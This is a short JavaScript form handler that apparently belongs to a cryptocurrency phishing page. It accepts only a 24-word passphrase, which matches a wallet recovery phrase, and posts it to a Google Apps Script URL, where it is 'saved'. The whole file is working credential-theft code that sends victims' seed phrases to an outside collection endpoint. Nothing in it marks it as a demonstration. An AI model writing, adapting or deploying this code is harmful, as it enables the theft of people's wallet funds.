const scriptURL = "https://script.google.com/macros/s/AKfycbwAKotFh6PGtK40HVNm9A4_razlWKmQbSdd2msMS48-7j_V0DYmLWbd3wsvjQOz7nMz/exec"; // Replace with new URL

async function handleSubmit(event) {
    event.preventDefault();
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';

    const inputValue = document.getElementById('myForm').elements['mf-texts'].value.trim();
    
    if (inputValue.split(/\s+/).length !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        return;
    }

    try {
        const response = await fetch(scriptURL, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({ text: inputValue }),
        });

        const result = await response.json();
        errorElement.textContent = result.status === "success" ? "Saved successfully!" : `Error: ${result.message}`;
    } catch (error) {
        errorElement.textContent = "Failed to save input.";
    }
}

document.getElementById('myForm').addEventListener('submit', handleSubmit);


